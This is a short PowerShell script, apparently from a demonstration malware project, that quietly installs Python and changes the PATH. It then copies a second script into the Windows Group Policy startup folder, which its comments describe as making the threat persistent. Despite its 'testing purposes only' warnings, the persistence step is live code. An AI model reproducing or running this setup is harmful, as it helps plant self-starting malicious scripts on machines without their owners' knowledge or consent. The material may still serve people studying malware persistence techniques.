###
#   Author: Degfrag_Defector
#   THIS IS MEANT FOR DEMONSTRATIONAL PURPOSES ONLY USE AT YOUR OWN RISK
###
Write-Output "WARNING: This is not meant to be used on a live machine"
Write-Output "WARNING: This is for TESTING PURPOSES ONLY!!!"
Write-Output "WARNING: USE AT YOUR OWN RISK"

#Installs Python
Write-Output "Installing Python"
C:\winMal\Code\pythonSoftware\python-3.11.1-amd64.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=1 | Out-Null
Write-Output "Python Installed"
Write-Output "Changing Path"
setx PATH "%PATH%;C:\Program-files\Python311\Scripts"
Write-Output "Path Updated"

#Makes the script run every time the machine is started
#Write-Output "Making Threat Persistant"
xcopy C:\winMal\Code\Scripts\drive2.ps1 C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\ /s /h /q
#-ExecutionPolicy Bypass -File "C:\Windows\System32\GroupPolicy\Machine\Scripts\Startup\drive2.ps1"
#Write-Output "Script Now Automated"
#pause